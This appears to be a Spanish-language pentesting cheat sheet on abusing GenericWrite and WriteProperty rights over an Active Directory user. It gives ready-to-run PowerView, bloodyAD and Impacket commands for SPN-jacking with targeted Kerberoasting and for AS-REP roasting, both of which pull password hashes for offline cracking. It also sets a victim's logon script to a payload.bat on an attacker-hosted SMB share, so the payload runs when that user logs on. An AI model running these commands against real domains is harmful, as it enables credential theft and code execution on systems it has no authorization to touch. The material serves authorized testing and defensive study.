Generic Write

GenericWrite permite modificar atributos del objeto objetivo y puede derivar en SPN-jacking, Shadow Credentials, logon scripts o RBCD según el objeto.

Aviso: GenericWrite/WriteSPN sobre Usuario "lidia" SPN-Jacking y Targeted Kerberoasting

Kerberoasting para crackear hash TGS

# Configurar SPN ficticio a lidia y solicitar un ticket de servicio TGS (hash) de lidia para cracking offline
# Windows
# SPN Jacking: Configurar el SPN ficticio (<servicio>/<inventado>) a lidia
Set-DomainObject -Identity 'lidia' -Set @{serviceprincipalname='http/webserver'}
# Targeted Kerberoasting: Obtener el ticket TGS de lidia
Get-DomainUser 'lidia' | Get-DomainSPNTicket | fl

# Kali
# SPN Jacking: Configurar el SPN ficticio (<servicio>/<inventado>) a lidia
bloodyAD --host <dc_ip> -d <dominio> -u 'alvaro' -p 'alvaro123' set object 'lidia' servicePrincipalName -v 'http/webserver'
# Targeted Kerberoasting: Obtener el ticket TGS de lidia
impacket-GetUserSPNs -dc-ip <dc_ip> <dominio>/'alvaro':'alvaro123' -request-user 'lidia'

Aviso: WriteProperty sobre Usuario "lidia" AS-REP Roast

ASREP-Roasting para crackear hash TGT

# Asignamos a lidia la flag DONT_REQ_PREAUTH
bloodyAD --host <dc_ip> -d <dominio> -u 'alvaro' -p 'alvaro123' add uac 'lidia' -f DONT_REQ_PREAUTH
# Solicitamos el ticket TGT del usuario AS-REP Roastable
impacket-GetNPUsers <dominio>/lidia -no-pass 2>/dev/null

Aviso: GenericWrite sobre Usuario "lidia" Logon Script

Asignar a lidia un script malicioso que se ejecutará cuando inicie sesión

# Kali: Levantar SMB server con el payload.bat
bloodyAD --host <dc_ip> -d <dominio> -u 'alvaro' -p 'alvaro123' set object 'lidia' scriptpath -v '\\<kali_ip>\payload.bat'

Set-DomainObject -Identity 'lidia' -SET @{scriptpath='C:\Temp\payload.ps1'}
